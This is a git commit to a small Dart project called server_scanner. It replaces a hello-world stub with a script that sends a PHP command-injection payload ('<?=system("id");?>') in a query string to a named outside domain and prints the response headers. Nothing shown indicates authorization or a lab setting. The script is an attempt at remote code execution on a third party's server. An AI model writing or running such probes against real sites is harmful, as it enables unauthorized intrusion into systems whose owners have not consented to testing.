1a905eb0d2bbaedf4916b748efe8ca15878c8c23
YabseraBogale <yabserapython@gmail.com>
2024-11-16 18:10:58 +0300

    ok

--- server_scanner/bin/server_scanner.dart
+++ server_scanner/bin/server_scanner.dart
@@ -1,5 +1,16 @@
-import 'package:server_scanner/server_scanner.dart' as server_scanner;
-
-void main(List<String> arguments) {
-  print('Hello world: ${server_scanner.calculate()}!');
+import 'package:http/http.dart' as http;
+void main(List<String> arguments) async{
+  final omedada='https://omedadplc.com/index.php?a=<?=system("id");?>';
+  try{
+    var result=await http.get(Uri.parse(omedada));
+    if(result.statusCode==200){
+      result.headers.forEach((key,value){
+        print("$key: $value");
+      });
+    } else{
+      print("Not Found");
+    }
+  }catch(e){
+    print(e);
+  }
 }
